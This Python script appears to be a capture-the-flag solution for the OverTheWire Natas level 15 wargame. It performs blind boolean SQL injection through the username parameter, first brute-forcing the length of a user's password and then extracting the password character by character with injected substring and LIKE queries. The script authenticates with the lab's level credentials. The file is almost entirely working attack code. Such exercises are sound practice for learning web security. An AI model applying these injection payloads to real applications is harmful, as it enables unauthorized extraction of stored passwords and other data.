import requests
import os

def get_length():
    # guess the length of the password.
    counter = 1 
    password_found = False
    while not password_found:
        length_test = requests.get('http://natas15.natas.labs.overthewire.org/?username=natas16" and (select length(password) from users where username="natas16")=' + str(counter) + '%23', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if "This user exists" in length_test.text:
            password_found = True
        else:
            counter = counter + 1
    return counter

def brute_force(length):
    # when length is known, iterate over each position for the correct character.
    solution = ""
    for position in range(1, length + 1): 
        ascii_value = 33
        pos_found = False
        while not pos_found: 
            brute_forcer = requests.get('http://natas15.natas.labs.overthewire.org/?username=natas16" and (select substring(password,' + str(position) + ',1) from users where username="natas16") like "' + chr(ascii_value) + '" collate latin1_general_cs%23', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
            
            if "This user exists" in brute_forcer.text:
                pos_found = True
                solution = solution + chr(ascii_value)
                os.system('clear')
                print(solution)
            else:
                ascii_value = ascii_value + 1
                # Filter out % and _ characters, doesn't really work with the URL encoding :-)
                if ascii_value == 37 or ascii_value == 95:
                    ascii_value = ascii_value + 1
    return True

length = get_length()
print(length)
brute_force(length)
